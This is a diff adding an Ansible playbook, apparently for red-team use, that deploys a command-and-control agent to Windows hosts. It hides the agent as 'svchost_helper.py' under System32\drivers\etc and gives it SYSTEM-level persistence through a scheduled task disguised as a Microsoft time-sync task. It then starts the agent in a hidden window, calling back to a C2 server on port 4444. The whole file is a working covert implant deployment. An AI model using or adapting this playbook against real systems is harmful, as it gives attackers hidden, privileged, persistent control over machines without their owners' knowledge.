@@ -1,0 +1,54 @@
+---
+# deploy_c2service.yml
+
+
+- name: Deploy C2 agent to Windows targets
+  hosts: windows
+  vars:
+    # Where the agent lands on the target
+    deploy_dir: "C:\\Windows\\System32\\drivers\\etc\\sync\\"
+    agent_script: "{{ deploy_dir }}svchost_helper.py"
+
+    # Local path to agent on your Kali jumpbox
+    local_agent: "./c2_programs/c2_agent.py"
+
+    # Your Kali red team IP and C2 server port
+    c2_host: "10.100.1.50"   # CHANGE to your actual Kali IP
+    c2_port: "4444"
+
+    task_name: "MicrosoftWindowsTimeSyncTask"
+
+  tasks:
+
+    - name: Create deploy directory
+      ansible.windows.win_file:
+        path: "{{ deploy_dir }}"
+        state: directory
+
+    - name: Copy agent to target
+      ansible.windows.win_copy:
+        src: "{{ local_agent }}"
+        dest: "{{ agent_script }}"
+
+    - name: Remove old scheduled task if exists
+      ansible.windows.win_shell: |
+        schtasks /Delete /TN "{{ task_name }}" /F
+      ignore_errors: true
+
+    - name: Create scheduled task to run agent on startup
+      ansible.windows.win_shell: |
+        schtasks /Create /TN "{{ task_name }}" /TR "python {{ agent_script }} {{ c2_host }} {{ c2_port }} {{ agent_id }}" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
+
+    - name: Run the agent now without waiting for reboot
+      ansible.windows.win_shell: |
+        Start-Process python -ArgumentList "{{ agent_script }} {{ c2_host }} {{ c2_port }} {{ agent_id }}" -WindowStyle Hidden
+      ignore_errors: true
+
+    - name: Confirm agent file is in place
+      ansible.windows.win_stat:
+        path: "{{ agent_script }}"
+      register: agent_file
+
+    - name: Print result
+      debug:
+        msg: "Agent deployed to {{ inventory_hostname }} at {{ agent_script }} — file exists: {{ agent_file.stat.exists }}"
